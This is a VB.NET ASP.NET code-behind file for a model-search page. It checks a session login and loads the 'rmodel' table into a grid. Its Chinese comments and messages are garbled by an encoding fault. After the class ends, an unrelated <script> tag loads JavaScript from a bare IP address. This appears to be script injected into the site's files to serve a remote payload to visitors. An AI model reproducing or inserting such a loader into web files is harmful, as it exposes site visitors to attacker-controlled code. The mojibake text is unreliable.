Imports System.Data
Imports System.Data.SqlClient

Public Class rmodelsearch
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblModel As System.Web.UI.WebControls.Label
    Protected WithEvents btnShowModel As System.Web.UI.WebControls.Button
    Protected WithEvents dgrdModel As System.Web.UI.WebControls.DataGrid
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        ' �ж��û���û��¼
        Me.lblWarning.Visible = False

        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If
    End Sub

    Private Sub btnShowModel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnShowModel.Click
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        strSql = "select * from rmodel"
        Try
            Dim mySqlAdap As New SqlDataAdapter(strSql, mySqlConn)
            Dim myDataSet As New DataSet

            mySqlConn.Open()
            mySqlAdap.Fill(myDataSet, "rmodel")
            Me.dgrdModel.DataSource = myDataSet.Tables("rmodel")
            Me.dgrdModel.DataBind()
            
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
